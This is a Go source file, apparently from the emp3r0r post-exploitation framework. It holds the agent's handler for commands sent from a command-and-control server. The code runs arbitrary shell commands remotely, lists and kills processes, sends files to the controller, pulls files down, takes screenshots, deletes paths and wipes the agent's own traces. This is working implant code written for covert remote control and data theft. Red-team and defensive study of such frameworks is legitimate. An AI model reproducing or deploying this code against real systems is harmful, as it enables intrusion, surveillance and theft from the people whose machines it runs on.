package agent

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/otiai10/copy"
	"github.com/spf13/pflag"
)

// exec cmd, receive data, etc
func processCCData(data *emp3r0r_data.MsgTunData) {
	var (
		data2send emp3r0r_data.MsgTunData
		out       string
		err       error
	)
	data2send.Tag = RuntimeConfig.AgentTag

	payloadSplit := strings.Split(data.Payload, emp3r0r_data.MagicString)
	if len(payloadSplit) <= 1 {
		log.Printf("Cannot parse CC command: %s, wrong OpSep (should be %s) maybe?",
			data.Payload, emp3r0r_data.MagicString)
		return
	}
	cmd_id := payloadSplit[len(payloadSplit)-1]

	// command from CC
	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
	cmdSlice := util.ParseCmd(cmd_str)

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	// send response to CC
	sendResponse := func(resp string) {
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
			emp3r0r_data.MagicString,
			strings.Join(cmdSlice, " "),
			emp3r0r_data.MagicString,
			resp)
		data2send.Payload += emp3r0r_data.MagicString + cmd_id // cmd_id for cmd tracking
		if err = Send2CC(&data2send); err != nil {
			log.Println(err)
		}
	}
	out = "Command failed"

	if strings.HasPrefix(cmdSlice[0], "!") {
		out = C2CommandsHandler(cmdSlice)
		sendResponse(out)
		return
	}

	// handle commands
	switch cmdSlice[0] {
	case "ps":
		// Usage: ps
		// Lists all running processes.
		out, err = shellPs()
		if err != nil {
			out = fmt.Sprintf("Failed to ps: %v", err)
			return
		}
	case "kill":
		// Usage: kill --dst <pid>...
		// Kills the specified processes.
		out, err = shellKill(cmdSlice[2:]) // skip "kill" and "--dst"
		if err != nil {
			out = fmt.Sprintf("Failed to kill: %v", err)
			return
		}
	case "net_helper":
		// Usage: net_helper
		// Displays network information.
		out = shellNet()
	case "get":
		// Usage: get --filepath <filepath> --offset <offset> --token <token>
		// Downloads a file from the agent starting at the specified offset.
		filepath := flags.StringP("filepath", "f", "", "File path to download")
		offset := flags.Int64P("offset", "o", 0, "Offset to start downloading from")
		token := flags.StringP("token", "t", "", "Token for the download")
		flags.Parse(cmdSlice[1:])
		if *filepath == "" || *offset < 0 || *token == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		log.Printf("File download: %s at %d with token %s", *filepath, *offset, *token)
		err = sendFile2CC(*filepath, *offset, *token)
		out = fmt.Sprintf("%s has been sent, please check", *filepath)
		if err != nil {
			log.Printf("get: %v", err)
			out = *filepath + err.Error()
		}
	case "screenshot":
		// Usage: screenshot
		// Takes a screenshot and sends the file path to CC.
		if len(cmdSlice) != 1 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out, err = Screenshot()
		if err != nil || out == "" {
			out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
			return
		}
		// move to agent root
		err = os.Rename(out, RuntimeConfig.AgentRoot+"/"+out)
		if err == nil {
			out = RuntimeConfig.AgentRoot + "/" + out
		}
	case "suicide":
		// Usage: suicide
		// Deletes all agent files and exits.
		if len(cmdSlice) != 1 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = fmt.Sprintf("Agent %s is self purging...", RuntimeConfig.AgentTag)
		err = os.RemoveAll(RuntimeConfig.AgentRoot)
		if err != nil {
			out = fmt.Sprintf("Failed to cleanup files")
		}
		sendResponse(out)
		log.Println("Exiting...")
		os.Exit(0)
	case "ls":
		// Usage: ls --dst <directory>
		// Lists the contents of the specified directory.
		target_dir := flags.StringP("dst", "d", ".", "Directory to list")
		flags.Parse(cmdSlice[1:])
		if flags.NArg() > 0 {
			*target_dir = flags.Arg(0)
		}
		log.Printf("Listing %s", *target_dir)
		out, err = util.LsPath(*target_dir)
		if err != nil {
			out = err.Error()
		}
	case "rm":
		// Usage: rm --dst <path>
		// Removes the specified file or directory.
		path := flags.StringP("dst", "d", "", "Path to remove")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = "Deleted " + *path
		if err = os.RemoveAll(*path); err != nil {
			out = fmt.Sprintf("Failed to delete %s: %v", *path, err)
		}
	case "mkdir":
		// Usage: mkdir --dst <path>
		// Creates a directory at the specified path.
		path := flags.StringP("dst", "d", "", "Path to create")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = "Mkdir " + *path
		if err = os.MkdirAll(*path, 0o700); err != nil {
			out = fmt.Sprintf("Failed to mkdir %s: %v", *path, err)
		}
	case "cp":
		// Usage: cp --src <source> --dst <destination>
		// Copies a file or directory from source to destination.
		src := flags.StringP("src", "s", "", "Source path")
		dst := flags.StringP("dst", "d", "", "Destination path")
		flags.Parse(cmdSlice[1:])
		if *src == "" || *dst == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = fmt.Sprintf("%s has been copied to %s", *src, *dst)
		if err = copy.Copy(*src, *dst); err != nil {
			out = fmt.Sprintf("Failed to copy %s to %s: %v", *src, *dst, err)
		}
	case "mv":
		// Usage: mv --src <source> --dst <destination>
		// Moves a file or directory from source to destination.
		src := flags.StringP("src", "s", "", "Source path")
		dst := flags.StringP("dst", "d", "", "Destination path")
		flags.Parse(cmdSlice[1:])
		if *src == "" || *dst == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = fmt.Sprintf("%s has been moved to %s", *src, *dst)
		if err = os.Rename(*src, *dst); err != nil {
			out = fmt.Sprintf("Failed to move %s to %s: %v", *src, *dst, err)
		}
	case "cd":
		// Usage: cd --dst <path>
		// Changes the current working directory to the specified path.
		path := flags.StringP("dst", "d", "", "Path to change to")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		if os.Chdir(*path) == nil {
			out = "changed directory to " + strconv.Quote(*path)
		} else {
			out = "cd failed"
		}
	case "pwd":
		// Usage: pwd
		// Prints the current working directory.
		if flags.NArg() != 0 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		pwd, err := os.Getwd()
		if err != nil {
			log.Println("processCCData: cant get pwd: ", err)
			pwd = err.Error()
		}
		out = "current working directory: " + pwd
	case "put":
		// Usage: put --file <file> --path <destination> --size <size>
		// Downloads a file from CC to the specified path on the agent.
		file_to_download := flags.StringP("file", "f", "", "File to download")
		path := flags.StringP("path", "p", "", "Destination path")
		size := flags.Int64P("size", "s", 0, "Size of the file")
		flags.Parse(cmdSlice[1:])
		if *file_to_download == "" || *path == "" || *size == 0 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		_, err = DownloadViaCC(*file_to_download, *path)
		if err != nil {
			out = fmt.Sprintf("processCCData: cant download %s: %v", *file_to_download, err)
			return
		}
		// checksum
		checksum := tun.SHA256SumFile(*path)
		downloadedSize := util.FileSize(*path)
		out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", *path, checksum)
		if downloadedSize < *size {
			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
		}
	default:
		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		if runtime.GOOS == "windows" {
			if !strings.HasSuffix(cmdSlice[0], ".exe") {
				cmdSlice[0] += ".exe"
			}
		}
		cmd := exec.Command(cmdSlice[0], flags.Args()...)
		var out_bytes []byte
		out_buf := bytes.NewBuffer(out_bytes)
		cmd.Stdout = out_buf
		cmd.Stderr = out_buf
		err = cmd.Start()
		if err != nil {
			log.Println(err)
			out = fmt.Sprintf("%s\n%v", out_buf.Bytes(), err)
		} else {
			// kill process after 10 seconds
			// except when & is appended
			if !keep_running {
				cmd.Wait()
			}
			go func() {
				for i := 0; i < 10; i++ {
					time.Sleep(time.Second)
				}
				if !keep_running && util.IsPIDAlive(cmd.Process.Pid) {
					err = cmd.Process.Kill()
					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
						cmd.Process.Pid, err)
					sendResponse(out)
					return
				}
			}()
		}
		out = out_buf.String()
		if keep_running {
			out = fmt.Sprintf("%s running in background, PID is %d",
				cmdSlice, cmd.Process.Pid)
		}
	}
	defer sendResponse(out)
}
